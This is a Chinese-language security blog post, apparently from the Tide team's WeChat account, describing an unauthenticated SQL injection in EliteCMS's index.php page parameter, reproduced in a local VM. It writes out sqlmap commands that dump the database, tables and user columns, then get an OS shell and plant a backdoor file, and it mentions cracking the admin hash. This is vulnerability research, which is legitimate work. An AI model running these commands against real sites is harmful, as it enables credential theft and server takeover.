<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/YZ7_Eq9THydpzc50PPQKcQ)

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXu3bXekvbOVFvAicpfFJwIOcQOuakZ6jTmyNoeraLFgI4cibKrDRiaPAljUry4dy4e2zK8lUMyKfkGg/640?wx_fmt=png)

### **本地环境搭建：**

```
官网下载：http://www.elitecms.net/
```

### **安装步骤：**

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXcP8kEHKbd3fwwsAHkVPgWzIkOD8vOnO5JFibYP4MVkkRWnBG6ibIvXuTgroBCAfA2xwO82FzrvBZw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXcP8kEHKbd3fwwsAHkVPgW99odWhtsllaRicHyg7HZNm9tEttkJ1mISIcWWSor1V6dTEfTxcM0v7Q/640?wx_fmt=png)

#### **前台效果：**

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXcP8kEHKbd3fwwsAHkVPgWUTsNBs0uIlDadqdMmxH0fibqnegMPwEJYhhI5NpGTr9fziar8D97W6gA/640?wx_fmt=png)

#### **后台效果：**

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXcP8kEHKbd3fwwsAHkVPgWMicwFw5E8iaT7gVflromwVZewxexOtrbUNibO2Gqxb2Ycb08WMLrkgiaJQ/640?wx_fmt=png)

### **代码分析**

安装完以后，直接产看代码的文件，全局正则匹配 select .*? where

  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXcP8kEHKbd3fwwsAHkVPgWicJTam1RibktkCz6s9pUw8cKfYvfO7VGoBvUSic6eyQOjHB3vc9O1g20A/640?wx_fmt=png)

快速通读下代码上下文，这里没有加过滤。接着搜索哪里调用了这个函数。

  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXcP8kEHKbd3fwwsAHkVPgWPw9Soia0S7DiboDm8DhlI7ypUzroTHyFgJicbuJOuO8fo9WT4bt93LRkQ/640?wx_fmt=png)

这里有调用，而且没有过滤，直接访问页面，抓包。  

```
无需用户登录直接访问URL：http://www.elitecms.com/index.php?page=1
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXcP8kEHKbd3fwwsAHkVPgW8G3HsmqPYNUCCOQ4l7BJR9MUiaI1feWzeVa3oGVbe5fwoxicKLbwwYvA/640?wx_fmt=png)

手动在 page 中构建 payload，在 page=1 后面直接加个单引号，进行验证。  
访问后，数据库返回来页面错误

  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXcP8kEHKbd3fwwsAHkVPgWcC0Q7LQ52poDWRa9iaZrAN02EunM4eFvwibMRpV9NLbzI9gBxibw8SPQw/640?wx_fmt=png)

很明显这里有注入，用 SQLmap 跑一下数据库信息  

```
sqlmap命令：
sqlmap -u “http://www.elitecms.com/index.php?page=1" –current-db –batch
```

数据库名信息：

  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXcP8kEHKbd3fwwsAHkVPgWoEmO4jmT5yrAwjykjs0Qv2rWd8tuWqet138MIH1R5WAzxX6Qia78Mug/640?wx_fmt=png)

然后使用下面这个命令获取数据库表信息  

```
sqlmap -u “http://www.elitecms.com/index.php?page=1" -D elitecms –tables  –batch：
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXcP8kEHKbd3fwwsAHkVPgWvcsqcE249LdLqwqXQqu4atgXUF6ibao5ea19bQiagMegBO64p1spUYibw/640?wx_fmt=png)

然后使用下面这个命令获取用户表里的字段信息:  

```
sqlmap -u “http://www.elitecms.com/index.php?page=1" -D elitecms -T users –columns  –batch
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXcP8kEHKbd3fwwsAHkVPgW5UDcKic9hwLhjnB7OPVOrc9H6ricuRTkRiaw6qdJbmAwSDxELraia2LjibA/640?wx_fmt=png)

最后获得管理员用户信息，使用下面命令：

  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXcP8kEHKbd3fwwsAHkVPgWibUWQPJBmVYldHCtsCsrahDNQnrXkiaWS61NSJZZZ25h08ZcibQU6XX8g/640?wx_fmt=png)

通过上面的 hash 值，借助第三方平台拿下明文密码：

  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXcP8kEHKbd3fwwsAHkVPgWYKsfq2ibFK0uNkQLR7ublXCsBCKSRjCxdQCa4Qs373NO9EQic2JEFiaNg/640?wx_fmt=png)

此时进入系统后台：

  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXcP8kEHKbd3fwwsAHkVPgWhTOpNnW23VeUGQib6kBAhpur0JqWgqaAd2NtqGGblT3wT9icHibYj2EmQ/640?wx_fmt=png)

拿下系统后台权限，可以使用后台的全部功能。  

```
接着通过—os-shell的选项，拿下服务权限，命令如下：sqlmap -u “http://www.elitecms.com/index.php?page=1" –os-shell，
```

在过程中填写路径的时候，填上我们的实际路径就好，如下图所示：

  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXcP8kEHKbd3fwwsAHkVPgWVnf54lQxcokEOicJkqlqc1QOrLRhksLicyG7ecb6VwPK8qkRyzv2Hx6w/640?wx_fmt=png)

选择 2，在下面填写路径，最后结果返回系统 shell，同时创建了后门文件。通过 shell 执行系统命令：

  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXcP8kEHKbd3fwwsAHkVPgWAm4CWjNM2TicuM6DzObHRiap0jKialXr1WnayaO9vGXobb6JibamMfspDQ/640?wx_fmt=png)

也可访问后门文件：

  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXcP8kEHKbd3fwwsAHkVPgW7q6zicYdBtNVM0PwKZYr81CAgQGNXxnyuibx0lCFrrB0HPbaZvpiaDGoQ/640?wx_fmt=png)  

至此，通过前台文件 index.php，无需用户登录，实现了拿系统后台权限，和服务器权限。造成了非常严重的后果。全过程都在本地虚拟机中进行的测试，域名也是解析的本地解析。

E

N

D

**关**

**于**

**我**

**们**

Tide 安全团队正式成立于 2019 年 1 月，是新潮信息旗下以互联网攻防技术研究为目标的安全团队，团队致力于分享高质量原创文章、开源安全工具、交流安全技术，研究方向覆盖网络攻防、系统安全、Web 安全、移动终端、安全开发、物联网 / 工控安全 / AI 安全等多个领域。

团队作为 “省级等保关键技术实验室” 先后与哈工大、齐鲁银行、聊城大学、交通学院等多个高校名企建立联合技术实验室。团队公众号自创建以来，共发布原创文章 400 余篇，自研平台达到 31 个，目有 18 个平台已开源。此外积极参加各类线上、线下 CTF 比赛并取得了优异的成绩。如有对安全行业感兴趣的小伙伴可以踊跃加入或关注我们。

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUGxmZ0l89buUNbyVALKxic2nM7hnDCkAKIrjKhdcDfVkGq3PxNzgs7m55BBMwmicc0AvFpYcrd6J6Q/640?wx_fmt=jpeg)